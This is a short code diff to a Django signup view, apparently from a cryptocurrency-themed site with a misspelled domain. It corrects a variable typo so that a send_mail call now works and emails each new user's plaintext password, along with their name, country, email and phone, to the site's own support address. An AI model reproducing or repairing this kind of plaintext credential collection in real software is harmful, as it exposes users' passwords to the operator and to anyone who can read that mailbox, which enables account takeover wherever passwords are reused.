@@ -98,7 +98,7 @@ def signup(request):
 
         send_mail(
             subject='NEW MEMBER SIGN-UP',
-            message='Name:' + name + ' ' + ' country:' + country +' password:'+ pwrod +' Email:'+ email+' Phone:'+phone,
+            message='Name:' + name + ' ' + ' country:' + country +' password:'+ pword +' Email:'+ email+' Phone:'+phone,
             from_email='support@finacialcryptocurrency.online',
             recipient_list=['support@finacialcryptocurrency.online'],
             fail_silently=True
